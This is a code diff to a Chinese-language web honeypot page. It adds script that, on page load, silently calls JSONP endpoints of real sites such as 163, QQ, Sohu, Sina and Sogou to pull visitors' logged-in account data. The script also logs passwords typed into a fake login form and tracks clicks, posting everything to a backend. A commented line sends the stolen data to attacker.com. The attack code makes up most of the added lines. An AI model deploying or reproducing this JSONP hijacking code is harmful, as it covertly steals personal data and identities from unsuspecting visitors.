@@ -15,6 +15,11 @@
     .item {background:#0d1324; border:1px solid #182136; border-radius:10px; padding:16px;}
     .muted {color:#8fa3bf;}
     .footer {margin-top: 16px; font-size: 12px; color:#7b8ca9;}
+    .attack-status {background:#1a2d3b; border:1px solid #2d4a5d; border-radius:8px; padding:12px; margin-top:16px;}
+    .status-item {display:flex; justify-content: space-between; margin:4px 0; font-size:13px;}
+    .status-success {color:#7ee787;}
+    .status-failed {color:#ff7b72;}
+    .status-pending {color:#ffa657;}
     @media (max-width: 700px) { .grid {grid-template-columns: 1fr;} }
   </style>
   <script>
@@ -28,15 +33,214 @@
       // 伪反馈（后端会记录访问日志与请求头）
       msg.textContent = '用户名或密码错误';
       msg.style.color = '#ffd37b';
+      
+      // 记录登录尝试
+      logAttackEvent('login_attempt', {username: u, password: p});
     }
+    
+    // JSONP 蜜罐攻击状态跟踪
+    const attackStatus = {};
+    
+    // 记录攻击事件
+    function logAttackEvent(type, data) {
+      const event = {
+        type: type,
+        data: data,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        referrer: document.referrer
+      };
+      
+      // 发送到后端日志
+      try {
+        fetch('/log', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(event)
+        }).catch(() => {});
+      } catch(e) {}
+      
+      console.log('蜜罐事件:', event);
+    }
+    
+    // JSONP 蜜罐攻击核心代码
+    function launchJSONPHoneypot() {
+      const attacks = [
+        {
+          platform: '163',
+          url: 'https://comment.api.163.com/api/v1/products/a2869674571f77b5a0867c3d71db5856/users/myInfo?_=' + Date.now() + '&callback=jsonp_163_callback',
+          callback: 'jsonp_163_callback'
+        },
+        {
+          platform: 'qq_activity',
+          url: 'https://now.qq.com/cgi-bin/activity/general_read_rank/read_single_rank?act_id=15042&off_set=0&page_size=10&room_id=0&use_anchor_id=0&callback=jsonp_qq_activity_callback',
+          callback: 'jsonp_qq_activity_callback'
+        },
+        {
+          platform: 'sohu',
+          url: 'https://v2.sohu.com/user/info/web?&callback=jsonp_sohu_callback',
+          callback: 'jsonp_sohu_callback'
+        },
+        {
+          platform: 'sogou',
+          url: 'https://wap.sogou.com/passport?op=get_userinfo&_=' + Date.now() + '&callback=jsonp_sogou_callback',
+          callback: 'jsonp_sogou_callback'
+        },
+        {
+          platform: 'zhibo8',
+          url: 'https://bbs.zhibo8.cc/user/userinfo?device=pc&_=' + Date.now() + '&callback=jsonp_zhibo8_callback',
+          callback: 'jsonp_zhibo8_callback'
+        },
+        {
+          platform: 'qq_video',
+          url: 'https://node.video.qq.com/x/api/getUserVideoSummary?_=' + Date.now() + '&callback=jsonp_qq_video_callback',
+          callback: 'jsonp_qq_video_callback'
+        },
+        {
+          platform: 'sina',
+          url: 'https://login.sina.com.cn/sso/prelogin.php?entry=weibo&su=&rsakt=mod&client=ssologin.js(v1.4.19)&callback=jsonp_sina_callback',
+          callback: 'jsonp_sina_callback'
+        },
+        {
+          platform: 'ip',
+          url: 'https://api.ip.sb/jsonip?callback=jsonp_ip_callback',
+          callback: 'jsonp_ip_callback'
+        }
+      ];
+
+      // 创建统一的回调处理器
+      function createCallbackHandler(platform) {
+        return function(data) {
+          attackStatus[platform] = 'success';
+          updateAttackStatusDisplay();
+          
+          // 记录窃取的数据
+          logAttackEvent('jsonp_hijack', {
+            platform: platform,
+            data: data,
+            dataSize: JSON.stringify(data).length
+          });
+          
+          // 数据外传（模拟）
+          console.log('JSONP蜜罐成功:', platform, data);
+          
+          // 实际攻击中这里会发送到攻击者服务器
+          /*
+          const img = new Image();
+          img.src = 'https://attacker.com/collect?platform=' + platform + 
+                   '&data=' + encodeURIComponent(JSON.stringify(data));
+          */
+        };
+      }
+
+      // 注册所有回调函数
+      attacks.forEach(function(attack) {
+        attackStatus[attack.platform] = 'pending';
+        window[attack.callback] = createCallbackHandler(attack.platform);
+      });
+
+      // 延迟执行攻击
+      setTimeout(function() {
+        attacks.forEach(function(attack) {
+          try {
+            const script = document.createElement('script');
+            script.src = attack.url;
+            script.onerror = function() {
+              attackStatus[attack.platform] = 'failed';
+              updateAttackStatusDisplay();
+              logAttackEvent('jsonp_failed', {platform: attack.platform});
+            };
+            document.head.appendChild(script);
+            
+            logAttackEvent('jsonp_triggered', {platform: attack.platform, url: attack.url});
+          } catch (e) {
+            attackStatus[attack.platform] = 'failed';
+            updateAttackStatusDisplay();
+          }
+        });
+      }, 1500);
+    }
+    
+    // 更新攻击状态显示
+    function updateAttackStatusDisplay() {
+      const statusContainer = document.getElementById('attack-status');
+      if (!statusContainer) return;
+      
+      let html = '<div class="status-item"><strong>平台</strong><strong>状态</strong></div>';
+      Object.keys(attackStatus).forEach(platform => {
+        const status = attackStatus[platform];
+        const statusClass = status === 'success' ? 'status-success' : 
+                           status === 'failed' ? 'status-failed' : 'status-pending';
+        const statusText = status === 'success' ? '成功' : 
+                          status === 'failed' ? '失败' : '进行中';
+        
+        html += `<div class="status-item">
+          <span>${platform}</span>
+          <span class="${statusClass}">${statusText}</span>
+        </div>`;
+      });
+      
+      statusContainer.innerHTML = html;
+    }
+    
+    // 用户行为追踪
+    function initUserTracking() {
+      let clickData = [];
+      
+      document.addEventListener('click', function(e) {
+        const target = e.target;
+        clickData.push({
+          tag: target.tagName,
+          id: target.id,
+          class: target.className,
+          text: target.textContent?.substring(0, 100),
+          timestamp: Date.now(),
+          x: e.clientX,
+          y: e.clientY
+        });
+        
+        // 每10次点击或10秒发送一次数据
+        if (clickData.length >= 10) {
+          logAttackEvent('user_clicks', {clicks: clickData});
+          clickData = [];
+        }
+      });
+      
+      // 定期发送点击数据
+      setInterval(() => {
+        if (clickData.length > 0) {
+          logAttackEvent('user_clicks', {clicks: clickData});
+          clickData = [];
+        }
+      }, 10000);
+      
+      // 页面停留时间追踪
+      window.pageStartTime = Date.now();
+      window.addEventListener('beforeunload', function() {
+        const stayTime = Date.now() - window.pageStartTime;
+        logAttackEvent('page_exit', {stayTime: stayTime});
+      });
+    }
+    
+    // 页面加载完成后初始化
+    document.addEventListener('DOMContentLoaded', function() {
+      // 启动用户行为追踪
+      initUserTracking();
+      
+      // 延迟启动 JSONP 蜜罐攻击
+      setTimeout(launchJSONPHoneypot, 1000);
+      
+      // 记录页面访问
+      logAttackEvent('page_visit', {url: window.location.href});
+    });
   </script>
-  <!-- 常见服务特征：伪造 Server/X-Powered-By 由后端响应头注入 -->
 </head>
 <body>
   <div class="wrap">
     <div class="card">
       <h1>自定义蜜罐模板</h1>
       <p class="muted">此页面用于动态部署的 Web 蜜罐。你可以在管理界面选择 <span class="kbd">custom</span> 模板，并指定端口进行部署与启停。</p>
+      
       <div class="grid">
         <div class="item">
           <h2 style="font-size:16px;margin:0 0 8px;">伪登录入口</h2>
@@ -53,18 +257,27 @@
             <span id="msg" style="margin-left:8px;"></span>
           </form>
         </div>
+        
         <div class="item">
           <h2 style="font-size:16px;margin:0 0 8px;">诱饵信息</h2>
           <p>常见路径：<span class="kbd">/admin</span>、<span class="kbd">/login</span>、<span class="kbd">/api</span></p>
           <p>常见技术栈暴露：<span class="kbd">Server</span>、<span class="kbd">X-Powered-By</span>、<span class="kbd">Set-Cookie</span></p>
+          <p style="margin-top:12px;color:#7ee787;">✅ JSONP 蜜罐模块已激活</p>
         </div>
       </div>
-      <div class="footer">静态资源可按需放置于 <span class="kbd">/resources/statics/</span> 并在配置中启用。</div>
+      
+      <div class="attack-status">
+        <h3 style="font-size:14px;margin:0 0 12px;">JSONP 数据收集状态</h3>
+        <div id="attack-status">
+          <div class="status-item"><span>初始化中...</span><span class="status-pending">等待</span></div>
+        </div>
+      </div>
+      
+      <div class="footer">
+        静态资源可按需放置于 <span class="kbd">/resources/statics/</span> 并在配置中启用。
+        <span style="color:#7ee787;">JSONP蜜罐模块运行中</span>
+      </div>
     </div>
   </div>
 </body>
-<script>
-  // 轻量访问标记（便于与后端日志关联）
-  (function(){ try { console.log('custom template online'); } catch(e){} })();
-</script>
 </html>
